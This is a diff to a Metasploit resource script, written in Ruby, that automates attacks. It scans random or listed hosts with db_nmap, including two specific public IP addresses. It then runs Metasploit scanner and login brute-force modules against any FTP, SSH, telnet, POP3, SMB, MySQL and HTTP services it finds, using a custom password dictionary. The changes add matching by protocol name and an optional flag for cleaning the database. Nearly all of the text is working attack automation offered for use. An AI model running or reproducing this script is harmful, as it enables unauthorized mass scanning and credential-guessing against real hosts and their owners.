@@ -1,7 +1,8 @@
    <ruby>
       help = %Q|
         Description:
-          setg RANDOM 1000 - Limit number of random rhosts to search
+          setg CLEAN false - Do not clean database at script exit.
+          setg RANDOM 1000 - Limit the number of random rhosts to search
           setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with ports open
           setg RHOSTS 216.15.177.33 186.210.228.3 - To instruct db_nmap to check targets for ports open
           setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
@@ -53,6 +54,7 @@
       xname = framework.db.hosts.map(&:os_name).join(' ')
       xhost = framework.db.hosts.map(&:address).join(' ')
       xport = framework.db.services.map(&:port).join(' ')
+      proto = framework.db.services.map(&:proto).join(' ')
       print_status("Target systems detected: #{xname}")
       run_single("setg RHOSTS #{xhost}")
       Rex::sleep(2.0)
@@ -77,7 +79,7 @@
               return nil
          end
 
-         if xport =~ /21/i
+         if xport =~ /21/i or proto =~ /ftp/i
               print_warning("Remote Target port: 21 ftp found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/ftp/ftp_version")
@@ -93,7 +95,7 @@
               run_single("exploit")
          end
 
-         if xport =~ /22/i
+         if xport =~ /22/i or proto =~ /ssh/i
               print_warning("Remote Target port: 22 ssh found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/ssh/ssh_login")
@@ -104,7 +106,7 @@
               run_single("exploit")
          end
 
-         if xport =~ /23/i
+         if xport =~ /23/i or proto =~ /telnet/i
               print_warning("Remote Target port: 23 telnet found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/telnet/telnet_version")
@@ -116,7 +118,7 @@
               run_single("exploit")
          end
 
-         if xport =~ /110/i
+         if xport =~ /110/i or proto =~ /pop3/i
               print_warning("Remote Target port: 110 pop3 found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/pop3/pop3_version")
@@ -128,7 +130,7 @@
               run_single("exploit")
          end
 
-         if xport =~ /445/i
+         if xport =~ /445/i or proto =~ /smb/i
               print_warning("Remote Target port: 445 smb found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/smb/smb_version")
@@ -147,7 +149,7 @@
               run_single("exploit")
          end
 
-         if xport =~ /3306/i
+         if xport =~ /3306/i or proto =~ /mysql/i
               print_warning("Remote Target port 3306 mysql found.")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/mysql/mysql_version")
@@ -164,7 +166,7 @@
               Rex::sleep(1.5)
          end
 
-         if xport =~ /80/i
+         if xport =~ /80/i or proto =~ /http/i
               print_warning("Remote Target port: 80 http found")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/http/title")
@@ -179,12 +181,23 @@
               run_single("set THREADS 16")
               run_single("exploit")
          end
-      print_warning("please wait, Cleaning msfdb Database.")
+
+      print_warning("Please wait, Cleaning global variables.")
       Rex::sleep(1.5)
-      run_single("unsetg RANDOM RANDOM_HOSTS RHOSTS USERPASS_FILE")
-      run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE STOP_ON_SUCCESS")
-      run_single("services -d")
-      run_single("hosts -d")
+      if (framework.datastore['CLEAN'] == "false")
+           run_single("unsetg CLEAN RHOSTS RANDOM RANDOM_HOSTS USERPASS_FILE")
+           run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED BLANK_PASSWORDS USERPASS_FILE STOP_ON_SUCCESS")
+           print_line("")
+      else
+           run_single("unsetg CLEAN RHOSTS RANDOM RANDOM_HOSTS USERPASS_FILE")
+           run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED BLANK_PASSWORDS USERPASS_FILE STOP_ON_SUCCESS")
+           print_warning("Please wait, Cleaning database.")
+           Rex::sleep(1.5)
+           run_single("hosts -d")
+           run_single("services -d")
+           print_line("")
+      end
+
       print_warning("Logfile stored under: /root/mysql_brute.log")
       print_status("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
    </ruby>
